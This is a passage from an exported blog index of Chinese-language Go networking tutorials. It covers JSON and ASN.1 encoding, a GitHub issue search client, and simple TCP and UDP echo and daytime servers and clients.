fmt.Println(newPerson.String()) &#125; os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[10]-json","slug":"go-network-10-json","date":"2019-01-19T06:35:23.000Z","updated":"2019-03-04T15:50:52.666Z","comments":true,"path":"2019/01/19/go-network-10-json/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-10-json/","excerpt":"","text":"JavaScript对象表示法（JSON）是一种用于发送和接收结构化信息的标准协议。在类似的协议中，JSON并不是唯一的一个标准协议。XML、ASN.1和Google的Protocol Buffers都是类似的协议，并且有各自的特色，但是由于简洁性、可读性和流行程度等原因，JSON是应用最广泛的一个。 Go语言对于这些标准格式的编码和解码都有良好的支持，由标准库中的encoding/json、encoding/xml、encoding/asn1等包提供支持（译注：Protocol Buffers的支持由github.com/golang/ protobuf 包提供），并且这类包都有着相似的API接口。本节，我们将对重要的encoding/json包的用法做个概述。 JSON是对JavaScript中各种类型的值——字符串、数字、布尔值和对象——Unicode本文编码。它可以用有效可读的方式表示第三章的基础数据类型和本章的数组、slice、结构体和map等聚合数据类型。 基本的JSON类型有数字（十进制或科学记数法）、布尔值（true或false）、字符串，其中字符串是以双引号包含的Unicode字符序列，支持和Go语言类似的反斜杠转义特性，不过JSON使用的是\\Uhhhh转义数字来表示一个UTF-16编码（译注：UTF-16和UTF-8一样是一种变长的编码，有些Unicode码点较大的字符需要用4个字节表示；而且UTF-16还有大端和小端的问题），而不是Go语言的rune类型。 这些基础类型可以通过JSON的数组和对象类型进行递归组合。一个JSON数组是一个有序的值序列，写在一个方括号中并以逗号分隔；一个JSON数组可以用于编码Go语言的数组和slice。一个JSON对象是一个字符串到值的映射，写成以系列的name:value对形式，用花括号包含并以逗号分隔；JSON的对象类型可以用于编码Go语言的map类型（key类型是字符串）和结构体。例如： boolean true number -273.15 string “She said “Hello, BF”” array [“gold”, “silver”, “bronze”] object {“year”: 1980, “event”: “archery”, “medals”: [“gold”, “silver”, “bronze”]} 考虑一个应用程序，该程序负责收集各种电影评论并提供反馈功能。它的Movie数据类型和一个典型的表示电影的值列表如下所示。（在结构体声明中，Year和Color成员后面的字符串面值是结构体成员Tag；我们稍后会解释它的作用。） type Movie struct { Title string Year int json:&quot;released&quot; Color bool json:&quot;color,omitempty&quot; Actors []string } var movies = []Movie{ {Title: “Casablanca”, Year: 1942, Color: false, Actors: []string{“Humphrey Bogart”, “Ingrid Bergman”}}, {Title: “Cool Hand Luke”, Year: 1967, Color: true, Actors: []string{“Paul Newman”}}, {Title: “Bullitt”, Year: 1968, Color: true, Actors: []string{“Steve McQueen”, “Jacqueline Bisset”}}, // … } 这样的数据结构特别适合JSON格式，并且在两种之间相互转换也很容易。将一个Go语言中类似movies的结构体slice转为JSON的过程叫编组（marshaling）。编组通过调用json.Marshal函数完成： data, err := json.Marshal(movies) if err != nil { log.Fatalf(“JSON marshaling failed: %s”, err) } fmt.Printf(&quot;%s\\n&quot;, data) Marshal函数返还一个编码后的字节slice，包含很长的字符串，并且没有空白缩进；我们将它折行以便于显示： [{“Title”:“Casablanca”,“released”:1942,“Actors”:[“Humphrey Bogart”,“Ingr id Bergman”]},{“Title”:“Cool Hand Luke”,“released”:1967,“color”:true,“Ac tors”:[“Paul Newman”]},{“Title”:“Bullitt”,“released”:1968,“color”:true,&quot; Actors&quot;:[“Steve McQueen”,“Jacqueline Bisset”]}] 这种紧凑的表示形式虽然包含了全部的信息，但是很难阅读。为了生成便于阅读的格式，另一个json.MarshalIndent函数将产生整齐缩进的输出。该函数有两个额外的字符串参数用于表示每一行输出的前缀和每一个层级的缩进： data, err := json.MarshalIndent(movies, “”, &quot; “) if err != nil { log.Fatalf(“JSON marshaling failed: %s”, err) } fmt.Printf(”%s\\n&quot;, data) 上面的代码将产生这样的输出（译注：在最后一个成员或元素后面并没有逗号分隔符）： [ { “Title”: “Casablanca”, “released”: 1942, “Actors”: [ “Humphrey Bogart”, “Ingrid Bergman” ] }, { “Title”: “Cool Hand Luke”, “released”: 1967, “color”: true, “Actors”: [ “Paul Newman” ] }, { “Title”: “Bullitt”, “released”: 1968, “color”: true, “Actors”: [ “Steve McQueen”, “Jacqueline Bisset” ] } ] 在编码时，默认使用Go语言结构体的成员名字作为JSON的对象（通过reflect反射技术，我们将在12.6节讨论）。只有导出的结构体成员才会被编码，这也就是我们为什么选择用大写字母开头的成员名称。 细心的读者可能已经注意到，其中Year名字的成员在编码后变成了released，还有Color成员编码后变成了小写字母开头的color。这是因为构体成员Tag所导致的。一个构体成员Tag是和在编译阶段关联到该成员的元信息字符串： Year int json:&quot;released&quot; Color bool json:&quot;color,omitempty&quot; 结构体的成员Tag可以是任意的字符串面值，但是通常是一系列用空格分隔的key:&quot;value&quot;键值对序列；因为值中含义双引号字符，因此成员Tag一般用原生字符串面值的形式书写。json开头键名对应的值用于控制encoding/json包的编码和解码的行为，并且encoding/…下面其它的包也遵循这个约定。成员Tag中json对应值的第一部分用于指定JSON对象的名字，比如将Go语言中的TotalCount成员对应到JSON中的total_count对象。Color成员的Tag还带了一个额外的omitempty选项，表示当Go语言结构体成员为空或零值时不生成JSON对象（这里false为零值）。果然，Casablanca是一个黑白电影，并没有输出Color成员。 编码的逆操作是解码，对应将JSON数据解码为Go语言的数据结构，Go语言中一般叫unmarshaling，通过json.Unmarshal函数完成。下面的代码将JSON格式的电影数据解码为一个结构体slice，结构体中只有Title成员。通过定义合适的Go语言数据结构，我们可以选择性地解码JSON中感兴趣的成员。当Unmarshal函数调用返回，slice将被只含有Title信息值填充，其它JSON成员将被忽略。 var titles []struct{ Title string } if err := json.Unmarshal(data, &amp;titles); err != nil { log.Fatalf(“JSON unmarshaling failed: %s”, err) } fmt.Println(titles) // “[{Casablanca} {Cool Hand Luke} {Bullitt}]” 许多web服务都提供JSON接口，通过HTTP接口发送JSON格式请求并返回JSON格式的信息。为了说明这一点，我们通过Github的issue查询服务来演示类似的用法。首先，我们要定义合适的类型和常量： 123456789101112131415161718192021222324252627// Package github provides a Go API for the GitHub issue tracker.// See https://developer.github.com/v3/search/#search-issues.package githubimport &quot;time&quot;const IssuesURL = &quot;https://api.github.com/search/issues&quot;type IssuesSearchResult struct &#123; TotalCount int `json:&quot;total_count&quot;` Items []*Issue&#125;type Issue struct &#123; Number int HTMLURL string `json:&quot;html_url&quot;` Title string State string User *User CreatedAt time.Time `json:&quot;created_at&quot;` Body string // in Markdown format&#125;type User struct &#123; Login string HTMLURL string `json:&quot;html_url&quot;`&#125; 和前面一样，卽使对应的JSON对象名是小写字母，每个结构体的成员名也是声明为大小字母开头的。因为有些JSON成员名字和Go结构体成员名字并不相同，因此需要Go语言结构体成员Tag来指定对应的JSON名字。同样，在解码的时候也需要做同样的处理，GitHub服务返回的信息比我们定义的要多很多。 SearchIssues函数发出一个HTTP请求，然后解码返回的JSON格式的结果。因为用户提供的查询条件可能包含类似?和&amp;之类的特殊字符，为了避免对URL造成冲突，我们用url.QueryEscape来对查询中的特殊字符进行转义操作。 123456789101112131415161718192021222324252627282930313233package githubimport ( &quot;encoding/json&quot; &quot;fmt&quot; &quot;net/http&quot; &quot;net/url&quot; &quot;strings&quot;)// SearchIssues queries the GitHub issue tracker.func SearchIssues(terms []string) (*IssuesSearchResult, error) &#123; q := url.QueryEscape(strings.Join(terms, &quot; &quot;)) resp, err := http.Get(IssuesURL + &quot;?q=&quot; + q) if err != nil &#123; return nil, err &#125; // We must close resp.Body on all execution paths. // (Chapter 5 presents &apos;defer&apos;, which makes this simpler.) if resp.StatusCode != http.StatusOK &#123; resp.Body.Close() return nil, fmt.Errorf(&quot;search query failed: %s&quot;, resp.Status) &#125; var result IssuesSearchResult if err := json.NewDecoder(resp.Body).Decode(&amp;result); err != nil &#123; resp.Body.Close() return nil, err &#125; resp.Body.Close() return &amp;result, nil&#125; 在早些的例子中，我们使用了json.Unmarshal函数来将JSON格式的字符串解码为字节slice。但是这个例子中，我们使用了基于流式的解码器json.Decoder，它可以从一个输入流解码JSON数据，尽管这不是必须的。如您所料，还有一个针对输出流的json.Encoder编码对象。 我们调用Decode方法来填充变量。这里有多种方法可以格式化结构。下面是最简单的一种，以一个固定宽度打印每个issue，但是在下一节我们将看到如果利用模板来输出复杂的格式。 1234567891011121314151617181920212223// Issues prints a table of GitHub issues matching the search terms.package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;os&quot; &quot;gopl.io/ch4/github&quot;)func main() &#123; result, err := github.SearchIssues(os.Args[1:]) if err != nil &#123; log.Fatal(err) &#125; fmt.Printf(&quot;%d issues:\\n&quot;, result.TotalCount) for _, item := range result.Items &#123; fmt.Printf(&quot;#%-5d %9.9s %.55s\\n&quot;, item.Number, item.User.Login, item.Title) &#125;&#125; 通过命令行参数指定检索条件。下面的命令是查询Go语言项目中和JSON解码相关的问题，还有查询返回的结果： $ go build gopl.io/ch4/issues $ ./issues repo:golang/go is:open json decoder 13 issues: #5680 eaigner encoding/json: set key converter on en/decoder #6050 gopherbot encoding/json: provide tokenizer #8658 gopherbot encoding/json: use bufio #8462 kortschak encoding/json: UnmarshalText confuses json.Unmarshal #5901 rsc encoding/json: allow override type marshaling #9812 klauspost encoding/json: string tag not symmetric #7872 extempora encoding/json: Encoder internally buffers full output #9650 cespare encoding/json: Decoding gives errPhase when unmarshalin #6716 gopherbot encoding/json: include field name in unmarshal error me #6901 lukescott encoding/json, encoding/xml: option to treat unknown fi #6384 joeshaw encoding/json: encode precise floating point integers u #6647 btracey x/tools/cmd/godoc: display type kind of each named type #4237 gjemiller encoding/base64: URLEncoding padding is optional 对象存储到json文件中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* SaveJSON */package mainimport ( \"encoding/json\" \"fmt\" \"os\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func main() &#123; person := Person&#123; Name: Name&#123;Family: \"Newmarch\", Personal: \"Jan\"&#125;, Email: []Email&#123;Email&#123;Kind: \"home\", Address: \"jan@newmarch.name\"&#125;, Email&#123;Kind: \"work\", Address: \"j.newmarch@boxhill.edu.au\"&#125;&#125;&#125; saveJSON(\"person.json\", person)&#125;func saveJSON(fileName string, key interface&#123;&#125;) &#123; outFile, err := os.Create(fileName) checkError(err) encoder := json.NewEncoder(outFile) err = encoder.Encode(key) checkError(err) outFile.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; 解码json文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* LoadJSON */package mainimport ( \"encoding/json\" \"fmt\" \"os\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func (p Person) String() string &#123; s := p.Name.Personal + \" \" + p.Name.Family for _, v := range p.Email &#123; s += \"\\n\" + v.Kind + \": \" + v.Address &#125; return s&#125;func main() &#123; var person Person loadJSON(\"person.json\", &amp;person) fmt.Println(\"Person\", person.String())&#125;func loadJSON(fileName string, key interface&#123;&#125;) &#123; inFile, err := os.Open(fileName) checkError(err) decoder := json.NewDecoder(inFile) err = decoder.Decode(key) checkError(err) inFile.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; json客户端 客户端写入数据，服务器读取数据。 服务器写入数据，客户端读取数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/* JSON EchoClient */package mainimport ( \"fmt\" \"net\" \"os\" \"encoding/json\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func (p Person) String() string &#123; s := p.Name.Personal + \" \" + p.Name.Family for _, v := range p.Email &#123; s += \"\\n\" + v.Kind + \": \" + v.Address &#125; return s&#125;func main() &#123; person := Person&#123; Name: Name&#123;Family: \"Newmarch\", Personal: \"Jan\"&#125;, Email: []Email&#123;Email&#123;Kind: \"home\", Address: \"jan@newmarch.name\"&#125;, Email&#123;Kind: \"work\", Address: \"j.newmarch@boxhill.edu.au\"&#125;&#125;&#125; if len(os.Args) != 2 &#123; fmt.Println(\"Usage: \", os.Args[0], \"host:port\") os.Exit(1) &#125; service := os.Args[1] conn, err := net.Dial(\"tcp\", service) checkError(err) encoder := json.NewEncoder(conn) decoder := json.NewDecoder(conn) for n := 0; n &lt; 10; n++ &#123; encoder.Encode(person) var newPerson Person decoder.Decode(&amp;newPerson) fmt.Println(newPerson.String()) &#125; os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; 服务器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/* JSON EchoServer */package mainimport ( \"fmt\" \"net\" \"os\" \"encoding/json\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func (p Person) String() string &#123; s := p.Name.Personal + \" \" + p.Name.Family for _, v := range p.Email &#123; s += \"\\n\" + v.Kind + \": \" + v.Address &#125; return s&#125;func main() &#123; service := \"0.0.0.0:1200\" tcpAddr, err := net.ResolveTCPAddr(\"tcp\", service) checkError(err) listener, err := net.ListenTCP(\"tcp\", tcpAddr) checkError(err) for &#123; conn, err := listener.Accept() if err != nil &#123; continue &#125; encoder := json.NewEncoder(conn) decoder := json.NewDecoder(conn) for n := 0; n &lt; 10; n++ &#123; var person Person decoder.Decode(&amp;person) fmt.Println(person.String()) encoder.Encode(person) &#125; conn.Close() // we're finished &#125;&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; 参考：go语言编码json 123456789101112131415161718192021From the Go JSON package specification, marshalling uses the following type-dependent default encodings:Boolean values encode as JSON booleans.Floating point and integer values encode as JSON numbers.String values encode as JSON strings, with each invalid UTF-8 sequence replaced by the encoding of the Unicode replacement character U+FFFD.Array and slice values encode as JSON arrays, except that []byte encodes as a base64-encoded string.Struct values encode as JSON objects. Each struct field becomes a member of the object. By default the object&apos;s key name is the struct field name converted to lower case. If the struct field has a tag, that tag will be used as the name instead.Map values encode as JSON objects. The map&apos;s key type must be string; the object keys are used directly as map keys.Pointer values encode as the value pointed to. (Note: this allows trees, but not graphs!). A nil pointer encodes as the null JSON object.Interface values encode as the value contained in the interface. A nil interface value encodes as the null JSON object.Channel, complex, and function values cannot be encoded in JSON. Attempting to encode such a value cause Marshal to return an InvalidTypeError.JSON cannot represent cyclic data structures and Marshal does not handle them. Passing cyclic structures to Marshal will result in an infinite recursion. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package mainimport \"encoding/json\"import \"fmt\"import \"os\"// 我们将用这两个结构体来说明编码和解码type Response1 struct &#123; Page int Fruits []string&#125;type Response2 struct &#123; Page int `json:\"page\"` Fruits []string `json:\"fruits\"`&#125;func main() &#123; // 首先来看看基本类型 bolB, _ := json.Marshal(true) fmt.Println(string(bolB)) intB, _ := json.Marshal(1) fmt.Println(string(intB)) fltB, _ := json.Marshal(2.34) fmt.Println(string(fltB)) strB, _ := json.Marshal(\"gopher\") fmt.Println(string(strB)) // 切片和map集合 slcD := []string&#123;\"apple\", \"peach\", \"pear\"&#125; slcB, _ := json.Marshal(slcD) fmt.Println(string(slcB)) mapD := map[string]int&#123;\"apple\": 5, \"lettuce\": 7&#125; mapB, _ := json.Marshal(mapD) fmt.Println(string(mapB)) // 自定义结构 res1D := &amp;Response1&#123; Page: 1, Fruits: []string&#123;\"apple\", \"peach\", \"pear\"&#125;&#125; res1B, _ := json.Marshal(res1D) fmt.Println(string(res1B)) // 我们可以用标识来明确某一个json元素的 res2D := &amp;Response2&#123; Page: 1, Fruits: []string&#123;\"apple\", \"peach\", \"pear\"&#125;&#125; res2B, _ := json.Marshal(res2D) fmt.Println(string(res2B)) // 编码json数据 byt := []byte(`&#123;\"num\":6.13,\"strs\":[\"a\",\"b\"]&#125;`)//我们需要定义一个变量来存储数据，map[string]interface&#123;&#125;将map中的数据 // `map[string]interface&#123;&#125;` 将字符串映射到任意数据类型 var dat map[string]interface&#123;&#125; // 解码, 和相关错误的检查。 if err := json.Unmarshal(byt, &amp;dat); err != nil &#123; panic(err) &#125; fmt.Println(dat) // 我们需要把它们转换成合适的类型。例如，在这里，我们将值放在float64型变量中。 num := dat[\"num\"].(float64) fmt.Println(num)// 访问嵌套数据需要一系列的强制转换。 strs := dat[\"strs\"].([]interface&#123;&#125;) str1 := strs[0].(string) fmt.Println(str1)//我们也可以将JSON解码为自定义数据类型，这有助于在程序中添加额外的类型安全性，并且在访问解码数据时消除类型断言的需要 str := `&#123;\"page\": 1, \"fruits\": [\"apple\", \"peach\"]&#125;` res := Response2&#123;&#125; json.Unmarshal([]byte(str), &amp;res) fmt.Println(res) fmt.Println(res.Fruits[0]) enc := json.NewEncoder(os.Stdout) d := map[string]int&#123;\"apple\": 5, \"lettuce\": 7&#125; enc.Encode(d)&#125;执行上面代码，将得到以下输出结果 -true12.34\"gopher\"[\"apple\",\"peach\",\"pear\"]&#123;\"apple\":5,\"lettuce\":7&#125;&#123;\"Page\":1,\"Fruits\":[\"apple\",\"peach\",\"pear\"]&#125;&#123;\"page\":1,\"fruits\":[\"apple\",\"peach\",\"pear\"]&#125;map[num:6.13 strs:[a b]]6.13a&#123;1 [apple peach]&#125;apple&#123;\"apple\":5,\"lettuce\":7&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[9]-asn.1","slug":"go-network-9-asn-1","date":"2019-01-19T04:12:24.000Z","updated":"2019-02-04T08:38:37.814Z","comments":true,"path":"2019/01/19/go-network-9-asn-1/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-9-asn-1/","excerpt":"","text":"Abstract Syntax Notation One（ASN.1）最初是在1984年为电信行业设计的。 ASN.1是一个复杂的标准，Go在包“asn1”中支持它的一个子集。 它从复杂的数据结构构建自描述的序列化数据。 它在当前网络系统中的主要用途是作为在认证系统中大量使用的X.509证书的编码。 Go中的支持基于读取和写入X.509证书所需的内容。 两个函数允许我们编码和解码数据: 12func Marshal(val interface&#123;&#125;) ([]byte, os.Error)func Unmarshal(val interface&#123;&#125;, b []byte) (rest []byte, err os.Error) asn.1编码与解码整数 12345678910111213141516171819202122232425262728/* ASN.1 */package mainimport ( \"encoding/asn1\" \"fmt\" \"os\")func main() &#123; mdata, err := asn1.Marshal(13) checkError(err) var n int _, err1 := asn1.Unmarshal(mdata, &amp;n) checkError(err1) fmt.Println(\"After marshal/unmarshal: \", n)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 为了管理更复杂的数据类型，我们必须更仔细地研究ASN.1支持的数据结构，以及如何在Go中完成ASN.1支持。 任何序列化方法都能够处理某些数据类型而不处理其他数据类型。 因此，为了确定任何序列化（如ASN.1）的适用性，您必须查看支持的可能数据类型与您希望在应用程序中使用的数据类型。 以下ASN.1类型取自http://www.obj-sys.com/asn1tutorial/node4.html 简单的类型是: 123456789101112131415161718192021222324252627s := &quot;hello&quot;mdata, _ := asn1.Marshal(s)var newstr stringasn1.Unmarshal(mdata, &amp;newstr)t := time.LocalTime()mdata, err := asn1.Marshal(t)var newtime = new(time.Time)_, err1 := asn1.Unmarshal(&amp;newtime, mdata)// using variablesvar t1 Tt1 = ...mdata1, _ := asn1.Marshal(t)var newT1 Tasn1.Unmarshal(&amp;newT1, mdata1)/// using pointersvar t2 = new(T)*t2 = ...mdata2, _ := asn1.Marshal(*t2)var newT2 = new(T)asn1.Unmarshal(newT2, mdata2) asn.1 服务器-客户端例子 服务器： 1234567891011121314151617181920212223242526272829303132333435363738394041/* ASN1 DaytimeServer */package mainimport ( \"encoding/asn1\" \"fmt\" \"net\" \"os\" \"time\")func main() &#123; service := \":1200\" tcpAddr, err := net.ResolveTCPAddr(\"tcp\", service) checkError(err) listener, err := net.ListenTCP(\"tcp\", tcpAddr) checkError(err) for &#123; conn, err := listener.Accept() if err != nil &#123; continue &#125; daytime := time.Now() // Ignore return network errors. mdata, _ := asn1.Marshal(daytime) conn.Write(mdata) conn.Close() // we're finished &#125;&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 客户端： 12345678910111213141516171819202122232425262728293031323334353637383940414243/* ASN.1 DaytimeClient */package mainimport ( \"encoding/asn1\" \"fmt\" \"io/ioutil\" \"net\" \"os\" \"time\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s host:port\", os.Args[0]) os.Exit(1) &#125; service := os.Args[1] conn, err := net.Dial(\"tcp\", service) checkError(err) defer conn.Close() result, err := ioutil.ReadAll(conn) checkError(err) var newtime time.Time _, err1 := asn1.Unmarshal(result, &amp;newtime) checkError(err1) fmt.Println(\"After marshal/unmarshal: \", newtime.String()) os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 测试： 123456服务器：$ go build .jacksondeMacBook-Pro:net jackson$ ./net客户端：$ ./client 127.0.0.1:1200After marshal/unmarshal: 2019-01-19 12:32:47 +0800 CST","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[8]-conn","slug":"go-network-8-conn","date":"2019-01-19T03:43:05.000Z","updated":"2019-02-04T08:38:32.903Z","comments":true,"path":"2019/01/19/go-network-8-conn/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-8-conn/","excerpt":"","text":"到目前为止，我们已经区分了TCP的API和UDP的API，例如使用DialTCP和DialUDP分别返回TCPConn和UDPConn。 Conn类型是一个接口，TCPConn和UDPConn都实现了这个接口。 在很大程度上，您可以处理此接口而不是两种类型。 您可以使用dail函数，而不是TCP和UDP的单独功能 1func Dial(net, laddr, raddr string) (c Conn, err os.Error) 网络可以是“tcp”，“tcp4”（仅限IPv4），“tcp6”（仅限IPv6），“udp”，“udp4”（仅限IPv4），“udp6”（仅限IPv6）， “ip”，“ip4”（仅限IPv4）和“ip6”仅限IPv6。 它将返回Conn接口的适当实现。 请注意，此函数采用字符串而不是地址作为raddr参数，因此使用此函数的程序可以避免首先生成地址类型。 之前写好的客户端： 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* GetHeadInfo */package mainimport ( \"net\" \"os\" \"fmt\" \"io/ioutil\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s host:port \", os.Args[0]) os.Exit(1) &#125; service := os.Args[1] // 生成TCPAddr tcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service) checkError(err) // 创建网络连接 conn, err := net.DialTCP(\"tcp\", nil, tcpAddr) checkError(err) // 写数据 _, err = conn.Write([]byte(\"HEAD / HTTP/1.0\\r\\n\\r\\n\")) checkError(err) // 读数据 result, err := ioutil.ReadAll(conn) checkError(err) fmt.Println(string(result)) os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 修改为： 123456789101112131415161718192021222324252627282930313233343536373839404142/* IPGetHeadInfo */package mainimport ( \"bytes\" \"fmt\" \"io\" \"io/ioutil\" \"net\" \"os\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s host:port\", os.Args[0]) os.Exit(1) &#125; service := os.Args[1] conn, err := net.Dial(\"tcp\", service) checkError(err) defer conn.Close() _, err = conn.Write([]byte(\"HEAD / HTTP/1.0\\r\\n\\r\\n\")) checkError(err) result, err := ioutil.ReadAll(conn) checkError(err) fmt.Println(string(result)) os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 对于服务器也有两个新的方法： 12func Listen(net, laddr string) (l Listener, err os.Error)func (l Listener) Accept() (c Conn, err os.Error) 之前的服务器例子可以修改为： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* ThreadedIPEchoServer */package mainimport ( \"fmt\" \"net\" \"os\")func main() &#123; service := \":1200\" listener, err := net.Listen(\"tcp\", service) checkError(err) for &#123; conn, err := listener.Accept() if err != nil &#123; continue &#125; go handleClient(conn) &#125;&#125;func handleClient(conn net.Conn) &#123; defer conn.Close() var buf [512]byte for &#123; n, err := conn.Read(buf[0:]) if err != nil &#123; return &#125; _, err2 := conn.Write(buf[0:n]) if err2 != nil &#123; return &#125; &#125;&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 如果你想编写UDP服务器，那么有一个接口PacketConn和一个返回此实现的方法： 1func ListenPacket(net, laddr string) (c PacketConn, err os.Error) 此接口具有主要方法ReadFrom和WriteTo来处理数据包读取和写入。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[7]-udp","slug":"go-network-7-udp","date":"2019-01-18T16:32:20.000Z","updated":"2019-02-04T08:38:26.659Z","comments":true,"path":"2019/01/19/go-network-7-udp/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-7-udp/","excerpt":"","text":"UDP客户端和服务器使用数据包含来源以及目的地信息。客户端或服务器不会维护维护消息的状态。 无法保证消息能够到达，也无法保证按照顺序到达。 udp常见方法： 12345func ResolveUDPAddr(net, addr string) (*UDPAddr, os.Error)func DialUDP(net string, laddr, raddr *UDPAddr) (c *UDPConn, err os.Error)func ListenUDP(net string, laddr *UDPAddr) (c *UDPConn, err os.Error)func (c *UDPConn) ReadFromUDP(b []byte) (n int, addr *UDPAddr, err os.Errorfunc (c *UDPConn) WriteToUDP(b []byte, addr *UDPAddr) (n int, err os.Error) udp客户端和tcp类似： udp 客户端 1234567891011121314151617181920212223242526272829303132333435363738394041/* UDPDaytimeClient */package mainimport ( \"net\" \"os\" \"fmt\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s host:port\", os.Args[0]) os.Exit(1) &#125; service := os.Args[1] udpAddr, err := net.ResolveUDPAddr(\"udp4\", service) checkError(err) conn, err := net.DialUDP(\"udp\", nil, udpAddr) checkError(err) _, err = conn.Write([]byte(\"anything\")) checkError(err) var buf [512]byte n, err := conn.Read(buf[0:]) checkError(err) fmt.Println(string(buf[0:n])) os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error %s\", err.Error()) os.Exit(1) &#125;&#125; udp服务器与tcp有较大不同： udp 服务器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* UDPDaytimeServer */package mainimport ( \"fmt\" \"net\" \"os\" \"time\")func main() &#123; service := \":1200\" udpAddr, err := net.ResolveUDPAddr(\"udp4\", service) checkError(err) conn, err := net.ListenUDP(\"udp\", udpAddr) checkError(err) for &#123; handleClient(conn) &#125;&#125;func handleClient(conn *net.UDPConn) &#123; var buf [512]byte _, addr, err := conn.ReadFromUDP(buf[0:]) if err != nil &#123; return &#125; daytime := time.Now().String() conn.WriteToUDP([]byte(daytime), addr) conn.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error %s\", err.Error()) os.Exit(1) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[6]-TCPConn","slug":"go-network-6-TCPConn","date":"2019-01-18T14:51:52.000Z","updated":"2019-02-04T08:38:21.326Z","comments":true,"path":"2019/01/18/go-network-6-TCPConn/","link":"","permalink":"https://dreamerjonson.com/2019/01/18/go-network-6-TCPConn/","excerpt":"","text":"TCPConn 客户端与服务器通信必备类型通信 两个主要的方法是： 12func (c *TCPConn) Write(b []byte) (n int, err os.Error)func (c *TCPConn) Read(b []byte) (n int, err os.Error) 客户端和服务器都使用TCPConn来读取和写入消息。 通常，客户端使用TCPConn将请求写入服务器，并从TCPConn读取响应。这一直持续到任一侧（或两侧）关闭连接。客户端使用下面函数建立TCP连接： 1func DialTCP(net string, laddr, raddr *TCPAddr) (c *TCPConn, err os.Error) 其中laddr是本地地址，通常设置为nil。raddr是服务器的远程地址，net是“tcp4”，“tcp6”或“tcp”之一，具体取决于您是否仅仅TCPv4连接， 